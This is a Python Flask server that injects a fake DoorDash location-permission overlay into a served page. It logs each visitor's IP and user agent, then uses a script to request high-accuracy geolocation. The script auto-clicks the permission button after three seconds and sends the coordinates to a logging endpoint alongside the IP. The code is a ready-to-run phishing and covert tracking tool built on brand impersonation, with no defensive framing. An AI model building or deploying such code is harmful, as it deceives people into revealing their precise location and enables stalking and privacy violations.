from flask import Flask, request, send_from_directory
import logging
import os

app = Flask(__name__)

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@app.route('/')
def serve_page():
    # Get client IP address
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # Log the IP and user agent
    logger.info(f"Visitor IP: {client_ip}, User Agent: {user_agent}")
    
    # Read your existing page.html
    try:
        with open('page.html', 'r') as f:
            html_content = f.read()
    except FileNotFoundError:
        html_content = "<html><body>Default page - page.html not found</body></html>"
    
    # Inject the permission overlay and tracking script
    overlay_and_script = """
    <style>
        #locationOverlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.85);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 99999;
            color: white;
            text-align: center;
            padding: 20px;
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
        }
        #locationButton {
            background: #FF3008;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 25px;
            margin-top: 25px;
            cursor: pointer;
            font-weight: bold;
        }
        #locationMessage {
            max-width: 300px;
            margin-bottom: 20px;
            font-size: 16px;
        }
    </style>

    <div id="locationOverlay">
        <h2>Location Access Required</h2>
        <div id="locationMessage">DoorDash needs your location to show nearby restaurants</div>
        <button id="locationButton">ALLOW LOCATION</button>
    </div>

    <script>
        // This will DEFINITELY trigger the iOS permission dialog when clicked
        document.getElementById('locationButton').addEventListener('click', function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        // Success - log location
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        fetch('/log_location?lat=' + lat + '&lon=' + lon);
                        document.getElementById('locationOverlay').style.display = 'none';
                    },
                    function(error) {
                        // Error - show message
                        document.getElementById('locationMessage').innerHTML = 
                            'Please enable location access in your browser settings';
                    },
                    {
                        enableHighAccuracy: true,
                        maximumAge: 0,
                        timeout: 15000
                    }
                );
            } else {
                document.getElementById('locationMessage').innerHTML = 
                    'Your browser does not support location services';
            }
        });

        // Fallback - try to trigger after 3 seconds if no interaction
        setTimeout(function() {
            if (document.getElementById('locationOverlay').style.display !== 'none') {
                document.getElementById('locationButton').click();
            }
        }, 3000);
    </script>
    """
    
    # Insert the overlay and script right before </body>
    if '</body>' in html_content:
        modified_html = html_content.replace('</body>', overlay_and_script + '</body>')
    else:
        modified_html = html_content + overlay_and_script
    
    return modified_html

@app.route('/log_location')
def log_location():
    lat = request.args.get('lat', 'unknown')
    lon = request.args.get('lon', 'unknown')
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    logger.info(f"LOCATION GRANTED - IP: {client_ip}, Latitude: {lat}, Longitude: {lon}")
    return '', 200

@app.route('/log_error')
def log_error():
    error_code = request.args.get('code', 'unknown')
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    logger.info(f"LOCATION DENIED - IP: {client_ip}, Error Code: {error_code}")
    return '', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
